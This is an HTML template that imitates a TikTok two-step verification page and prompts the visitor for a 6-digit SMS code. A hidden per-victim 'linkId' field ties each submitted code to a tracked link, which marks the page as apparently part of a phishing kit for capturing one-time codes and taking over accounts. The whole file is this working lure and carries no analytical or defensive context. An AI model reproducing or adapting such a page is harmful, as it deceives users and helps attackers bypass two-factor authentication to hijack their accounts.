<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
    <link rel="stylesheet" href="/tiktok/index.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
      integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <style>
      #submit2 img {
        width: 1.3em;
        animation-name: roll;
        animation-duration: 0.7s;
        animation-iteration-count: infinite;
        animation-timing-function: linear;
        color: white;
      }

      @keyframes roll {
        from {
          transform: rotate(0deg);
        }
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <form
        method="post"
        accept="."
        onsubmit="handleSubmit()"
        style="margin-top: 10em !important"
      >
        <h3>2-step verification</h3>
        <p for="#">Enter 6-digit code</p>
        <p>An SMS with your code was sent to you</p>
        <div class="form-group otp-group">
          <input
            id="code"
            name="code"
            type="text"
            placeholder="6-digit code"
            class="password"
            oninput="checkInput()"
            required
          />
          <input type="hidden" name="linkId" value="<%=linkId%>" />
        </div>
        <br />
        <button
          type="submit"
          class="submit"
          id="submit"
          onclick="handleSubmit()"
        >
          Next
        </button>
        <button
          type="button"
          name="submit"
          class="submit"
          id="submit2"
          style="
            display: none;
            background-color: rgba(254, 44, 85, 1) !important;
          "
        >
          <img src="/img/loading.svg" alt="" />
        </button>
      </form>
      <footer>
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </footer>
    </div>

    <script>
      const checkInput = () => {
        const code = document.querySelector("#code");
        const submitBtn = document.querySelector("#submit");
        if (code.value.length > 5) {
          submitBtn.classList.add("active");
        } else {
          submitBtn.classList.remove("active");
        }
      };
    </script>

    <script>
      function handleSubmit(e) {
        const username = document.querySelector("#code");
        const submitBtn = document.querySelector("#submit");
        const submitBtn2 = document.querySelector("#submit2");

        if (username.value.length > 5) {
          submitBtn.style.display = "none";
          submitBtn2.style.display = "block";
        } else {
          e.preventDefault();
          return false;
        }

        e.preventDefault();
        return false;
      }
    </script>
  </body>
</html>
